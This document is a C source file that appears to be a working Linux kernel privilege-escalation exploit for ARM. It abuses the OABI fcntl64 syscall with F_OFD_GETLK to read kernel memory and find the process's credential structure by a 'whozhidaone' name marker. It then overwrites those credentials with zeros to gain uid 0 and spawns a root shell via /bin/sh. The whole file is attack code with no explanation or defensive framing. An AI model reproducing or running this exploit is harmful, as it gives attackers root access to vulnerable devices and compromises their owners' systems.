#define _GNU_SOURCE

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <semaphore.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/utsname.h>
#include <sys/ptrace.h>
#include <unistd.h>
__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd, unsigned long arg){
    
    __asm __volatile (
    "swi    0x9000DD\n"
    "mov    pc, lr\n"
    :   
    :
    :
    );
}
void hexdump(unsigned char* buf, unsigned int size) {
    int i,j;
    for (i = 0;i < size;i += 16)
    {
        printf("%08x:", i);
        for (j = i;j < size && j < i + 16;j++)
        {
            printf(" %02x", buf[j]);
        }
        puts("");
    }
}

#define F_OFD_GETLK    36
#define F_OFD_SETLK    37
#define F_OFD_SETLKW 38


int main(int argc, char const *argv[]){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    system("touch tmp");
    int fd = open("/proc/cpuinfo", 0);
    struct flock *map_base = 0;
    if(fd == -1){
        perror("open");
        return -1;
    }
    map_base = (struct flock *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if(map_base == (void*)-1){
        perror("mmap");
        exit(1);
    }
    printf("map_base %p\n", map_base);
    memset(map_base, 0, 0x1000);
    map_base->l_start = SEEK_SET;
    if(sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)){
        perror("sys_oabi_fcntl64");
        exit(1);
    }
    char target[16] = "";
    strcpy(target, "whozhidaone\n");
    prctl(PR_SET_NAME, target);
    unsigned int addr = 0xc0000000;
    fd = open("tmp", 2);
    for (; addr <= 0xc8000000;addr += 0x10000) {
        write(fd, (void*)addr, 0x10000);
        printf("%p", addr);
        system("cat tmp|grep daone|od -tx1");
    }
    unsigned int cred;
    scanf("%zx", &cred);
    system("echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= > tmp_");
    system("base64 -d tmp_ > tmp__");
    fd = open("tmp__", 0);
    read(fd, (void*)cred, 0x20);
    if (getuid() == 0) {
        printf("get root\n");
        system("/bin/sh");
    }
    else {
        printf("failed");
    }
    munmap(map_base, 0x1000);
    return 0;
}
